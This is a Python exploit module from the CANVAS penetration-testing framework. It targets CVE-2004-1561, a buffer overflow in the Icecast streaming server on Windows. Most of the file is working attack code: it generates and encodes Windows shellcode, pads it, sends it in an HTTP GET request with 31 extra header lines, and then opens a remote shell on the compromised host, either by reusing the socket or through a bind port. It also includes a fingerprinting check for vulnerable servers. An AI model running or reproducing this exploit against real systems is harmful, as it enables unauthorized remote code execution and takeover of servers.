#! /usr/bin/env python
"""
ICECAST
"""
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("./exploits/recon/osdetect")
sys.path.append("../../exploits/recon/osdetect")
sys.path.append("./MOSDEF")
sys.path.append("../../MOSDEF")

from exploitutils import *
import addencoder
import chunkedaddencoder
import win32shell
from tcpexploit import tcpexploit
import mosdef, time
import shellcodeGenerator
import canvasengine, mosdef
from canvasengine import socket_save_list

from win32Node import win32Node
import win32MosdefShellServer


# GUI info
TESTBEDS="""vmware: XP sp0 \n vmware: XP sp1\nvmware: win2k SP3"""
NAME="ICECAST exploit"
DESCRIPTION="ICECAST exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Icecast.org"
DOCUMENTATION["Date public"]="September of 2004"
DOCUMENTATION["CVE Name"] = "CVE-2004-1561"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1561"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]

GTK2_DIALOG="dialog.glade2"


CHANGELOG="""

"""

NOTES="""
"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["N/A", 0,0x0],    # this would be enough
    }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 8000
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = "\0/\r\n"
        self.name=NAME

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF] # we setup a listener so we can switch payloads in gui too

    def createShellcode(self):
        # if -l -d is set, switch to bind mode !!!
        sc = shellcodeGenerator.win32()

        if self.callback and self.callback.ip == "0.0.0.0": # switching to BindMosdef mode
            sc.foundeip = 1

            # Icecast specific
            sc.addAttr("CreateThreadFindeip", None)
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            # end of Icecast specific

            sc.addAttr("BindMosdef", { "port" : self.callback.port })
            sc.addAttr("RecvExecWin32", {"socketreg": "FDSPOT"})

        else:

            sc.foundeip = 1
            sc.addAttr("CreateThreadFindeip", None)
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("GOFindSock", None)
            sc.addAttr("RecvExecWin32", None)

        self.shellcode = sc.get()
        if len(self.shellcode) < 824:
            self.shellcode = "A" * (824-len(self.shellcode)) + self.shellcode

        print "[!] size: %d"%len(self.shellcode)

        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode

    def test(self):
        # Every version is vulnerable at this moment :D
        self.port=int(self.argsDict.get("port",self.port))
        self.host=self.target.interface

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s=self.gettcpsock()

        try:
            s.connect( (self.host, self.port))
        except socket.error:
            return 0
        s.send("AAAAAAAAAAAAAAAAAAAAAAAA\r\n\r\n")
        try:
            buf=s.recv(300)
        except:
            self.log("Connection reset without sending us data")
            return 0
        s.close()
        if buf.find("Icecast2") > -1:
            return 1
        return 0


    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=1)

        self.s = self.gettcpsock()
        try:
            ret=self.s.connect( (self.host, self.port))
        except:
            self.log("Failed to connect")
            self.setInfo("%s attacking %s:%d - (failed to connect)"% (NAME, self.host, self.port), showlog=1)
            return 0

        self.s.set_timeout(10)
        self.s.sendall("GET / HTTP/1.0\r\n"+ "a\r\n" *31 +self.shellcode +"\r\n" "\r\n")

        # check for BindMosdef mode
        if self.callback and self.callback.ip == "0.0.0.0":
            self.s = self.gettcpsock()
            import time
            time.sleep(0.5)
            print "[!] Trying BindMosdef connect to: %s:%d"%(self.host, self.callback.port)
            try:
                self.s.connect((self.host, self.callback.port))
            except:
                self.log("Failed to connect")
                self.setInfo("%s attacking %s:%d - (failed to connect)"% (NAME, self.host, self.port), showlog=1)
                return 0

        ret=self.checkTriggerWin32(self.s)
        if not ret:
            #try twice
            ret=self.checkTriggerWin32(self.s)
        if ret:
            self.log("Got trigger!")
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            newshell = win32MosdefShellServer.win32shellserver(self.s,node,self.logfunction)
            newshell.node.startup()
            self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1)
            self.log("Thanks \\0/")
            return newshell.node
        else:
            self.log("No trigger for win32...failed to call GOcode?")
            self.setInfo("%s attacking %s:%d - (failed!)" % (NAME, self.host, self.port), showlog=1)
            return 0

    def usage(self):
        print "Usage: %s -t host [ -p port ] (recycles socket) -OR- %s -t host -l 0.0.0.0 -d port (binds port)"%(sys.argv[0], sys.argv[0])

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

